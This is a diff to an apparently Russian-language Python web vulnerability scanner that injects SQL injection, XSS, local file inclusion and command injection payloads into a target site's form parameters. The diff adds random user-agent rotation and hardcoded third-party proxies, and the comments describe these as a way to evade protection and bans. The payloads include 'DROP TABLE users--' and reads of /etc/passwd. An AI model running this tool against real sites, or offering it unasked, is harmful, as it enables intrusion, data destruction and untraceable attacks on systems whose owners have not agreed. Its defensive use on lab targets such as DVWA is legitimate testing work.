@@ -1,41 +1,84 @@
-
+import random
 import requests
 import urllib.parse
 import time
 import json
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+import argparse
 
+# ========== КОНФИГ (ДОЛЖЕН БЫТЬ В САМОМ НАЧАЛЕ) ==========
 CONFIG = {
     "timeout": 5,
+    # ============================================================
+    # Выбирай значение в зависимости от сценария:
+    #
+    #   Сценарий:                    | Рекомендуемая задержка:
+    #   ----------------------------|----------------------
+    #   Локальный тест (DVWA)       | 0.05 – 0.1
+    #   Реальный сайт (с разреш.)   | 0.3 – 0.5
+    #   Агрессивный пентест         | 0.1 – 0.3 можно если есть разрешение и договоренность
+    #   Обход защиты (с прокси)     | 0.5 – 1.0
+    #
+    #   Чем меньше задержка — тем быстрее, но выше риск бана.
+    #   Для локальных тестов можно ставить минимальные значения.
+    # ============================================================
     "delay": 0.3,
     "threads": 10,
     "output_json": "vuln_report.json",
     "output_html": "vuln_report.html",
-    "max_forms": 10,           # сколько форм сканировать на странице
+    "max_forms": 10,
     "user_agents": [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-    ]
+    ],
+    "proxies": [
+        "http://28.140.82.50:8443",
+        "http://8.219.97.248:80"
+    ],
+    "cookies": {}
 }
+
+# ========== НАСТРОЙКА СЕССИИ ==========
+session = requests.Session()
+
+# Проверяем, есть ли куки в конфиге
+if CONFIG.get("cookies"):
+    session.cookies.update(CONFIG["cookies"])   # <--- теперь ошибки нет
+
+# Устанавливаем случайный User-Agent
+session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
+
+# Настройка повторных попыток при сбоях
+retries = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
+session.mount('http://', HTTPAdapter(max_retries=retries))
+session.mount('https://', HTTPAdapter(max_retries=retries))
 #  БАЗА УЯЗВИМОСТЕЙ (можно добавить свои)
 VULN_DB = {
     "SQLi": {
-        "payloads": [
-            "' OR '1'='1",
-            "' OR 1=1--",
-            "' UNION SELECT NULL--",
-            "'); DROP TABLE users--"
-        ],
-        "error_signs": ["sql", "syntax", "mysql", "warning", "error", "unclosed"]
+         "payloads": [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "' UNION SELECT NULL--",
+        "'); DROP TABLE users--",
+        "' AND 1=1--",
+        "' AND 1=2--",
+        "' UNION SELECT @@version--",
+        "' AND ASCII(SUBSTRING((SELECT user()),1,1))>0--"
+    ],
+        "error_signs": ["sql", "syntax", "mysql", "warning", "error", "unclosed", "mysql_fetch"]
     },
     "XSS": {
         "payloads": [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert(1)>",
-            "\"><script>alert(1)</script>"
-        ],
-        "error_signs": ["<script>", "alert", "onerror"]
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "\"><script>alert(1)</script>",
+        "<svg/onload=alert(1)>",
+        "javascript:alert(1)"
+    ],
+        "error_signs": ["<script>", "alert", "onerror", "svg/onload"]
     },
     "LFI": {
         "payloads": [
@@ -43,7 +86,7 @@ VULN_DB = {
             "..\\..\\..\\windows\\win.ini",
             "%2e%2e%2fetc%2fpasswd"
         ],
-        "error_signs": ["root:", "boot.ini", "[extensions]"]
+        "error_signs": ["root:", "boot.ini", "[extensions]", "etc/passwd", "win.ini"]
     },
     "RCE": {
         "payloads": [
@@ -52,7 +95,7 @@ VULN_DB = {
             "& dir",
             "`id`"
         ],
-        "error_signs": ["uid=", "root", "Administrator"]
+        "error_signs": ["uid=", "root", "Administrator", "usr/bin", "windows"]
     }
 }
 
@@ -123,22 +166,24 @@ def extract_forms_and_params(url):
 # Тестирование одного параметра
 
 def test_parameter(url, param, method, payload):
-    """Отправляет запрос с payload, возвращает (текст_ответа, url_запроса)"""
     try:
+        # Случайно выбираем прокси из списка
+        proxy = random.choice(CONFIG["proxies"]) if CONFIG["proxies"] else None
+        proxies = {"http": proxy, "https": proxy} if proxy else None
+
+        # Обновляем User-Agent случайным образом для каждого запроса
+        session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
+
         if method == "get":
             test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-            response = requests.get(test_url, timeout=CONFIG["timeout"],
-                                    headers={"User-Agent": CONFIG["user_agents"][0]})
+            response = session.get(test_url, timeout=CONFIG["timeout"], proxies=proxies)
             return response.text, test_url
-        elif method == "post":
+        else:  # POST
             data = {param: payload}
-            response = requests.post(url, data=data, timeout=CONFIG["timeout"],
-                                     headers={"User-Agent": CONFIG["user_agents"][0]})
+            response = session.post(url, data=data, timeout=CONFIG["timeout"], proxies=proxies)
             return response.text, url
-        else:
-
-            return None, url
-    except Exception:
+    except Exception as e:
+        log_error(f"Ошибка при запросе: {e}")
         return None, url
 
 
@@ -210,7 +255,14 @@ def main():
     print("=" * 70)
     print(Colors.BOLD + "   СКАНЕР УЯЗВИМОСТЕЙ 3.0 (SQLi, XSS, LFI, RCE)" + Colors.RESET)
     print("=" * 70)
-
+    if CONFIG["proxies"]:
+        print("[*] Проверка прокси...")
+        for proxy in CONFIG["proxies"]:
+            try:
+                test = requests.get("http://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=5)
+                print(f"[+] {proxy} работает. Ваш IP через прокси: {test.text}")
+            except:
+                print(f"[-] {proxy} не отвечает. Пропускаем.")
     target_url = input("Введите базовый URL (например, http://testphp.vulnweb.com): ").strip()
     if not target_url.startswith("http"):
         target_url = "http://" + target_url
